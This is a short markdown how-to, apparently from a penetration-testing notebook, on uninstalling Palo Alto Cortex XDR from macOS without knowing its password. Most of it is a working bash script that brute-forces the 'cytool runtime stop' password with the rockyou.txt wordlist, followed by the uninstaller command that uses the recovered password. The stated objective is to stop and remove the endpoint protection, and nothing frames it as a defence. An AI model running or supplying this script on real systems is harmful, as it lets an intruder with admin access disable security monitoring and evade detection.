# MacOS - Uninstall Cortex XDR without know password
## Source
https://0xsp.com/security%20research%20%20development%20srd/combined-attacks-against-xdr/

https://mrd0x.com/cortex-xdr-analysis-and-bypass/
## Objective
Try to find the password for stop the service and uninstall Cortex XDR, with force brute attack.
## Prerequisits
Admin passwords in MacOS.
Download rockyou.txt password list.
## Funding the password
Run the script with admin privileges(sudo):
```bash=
#!/bin/bash

FILENAME="rockyou.txt"

LINES=$(cat $FILENAME)

for LINE in $LINES
do
	echo "Trying Password: $LINE"
	(echo "$LINE" | /Library/Application\ Support/PaloAltoNetworks/Traps/bin/cytool runtime stop all) 2>/dev/null && echo "Password found: $LINE" && exit 0
done
```
## Uninstalling Cortex XDR
Execute:
```bash=
sudo /Library/Application\ Support/PaloAltoNetworks/Traps/bin/traps_uninstaller_tool <the password found>
```
